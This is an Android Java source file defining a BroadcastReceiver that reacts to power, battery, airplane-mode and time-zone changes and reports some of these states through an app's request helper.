package com.inet.android.info;

import java.util.TimeZone;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.res.Resources;
import android.provider.Settings;

import com.inet.android.certificate.R;
import com.inet.android.request.RequestList;
import com.inet.android.utils.ValueWork;

public class BatteryTimeReceiver extends BroadcastReceiver {
	IntentFilter ifilter;
	Intent batteryIntent;
	Context mContext;

	// BroadcastReceiver mBatteryReceiver;
	@Override
	public void onReceive(Context context, Intent intent) {
		this.mContext = context;
		if (ValueWork.getState(0, context) == 0)
			return;
		Resources path = mContext.getApplicationContext().getResources();
		
		if (intent.getAction().equals(Intent.ACTION_POWER_CONNECTED)) {
			registryStateBattery(path.getString(R.string.connect_device));

		} else if (intent.getAction().equals(Intent.ACTION_POWER_DISCONNECTED)) {
			registryStateBattery(path.getString(R.string.disconnect_device));

		} else if (intent.getAction().equals(Intent.ACTION_BATTERY_LOW)) {
			registryStateBattery(path.getString(R.string.status_battery_low));

		} else if (intent.getAction().equals(Intent.ACTION_BATTERY_OKAY)) {
				registryStateBattery(path.getString(R.string.status_battery_okay));

		} else if (intent.getAction().equals(
				Intent.ACTION_AIRPLANE_MODE_CHANGED)) {

			boolean isEnabled = Settings.System.getInt(mContext
					.getApplicationContext().getContentResolver(),
					Settings.System.AIRPLANE_MODE_ON, 0) == 1;
			if (isEnabled) {
				RequestList.sendDataRequest(path.getString(R.string.airplane),
						path.getString(R.string.mode_on), mContext);
			} else {
				RequestList.sendDataRequest(path.getString(R.string.airplane),
						path.getString(R.string.mode_off), mContext);
			}

		} else if (intent.getAction().equals(Intent.ACTION_TIMEZONE_CHANGED)
				|| intent.getAction().equals(Intent.ACTION_TIME_CHANGED)) {
			TimeZone tz = TimeZone.getDefault();
			RequestList.sendDataRequest(path.getString(R.string.time_zone),
					tz.getDisplayName(false, TimeZone.SHORT)
							+ ", " + tz.getID(), mContext);
		}
	}

	private void registryStateBattery(String connect) {
		InfoBatteryReceiver myBatteryReceiver = new InfoBatteryReceiver(connect);
		this.mContext.getApplicationContext().registerReceiver(
				myBatteryReceiver,
				new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
	}
}
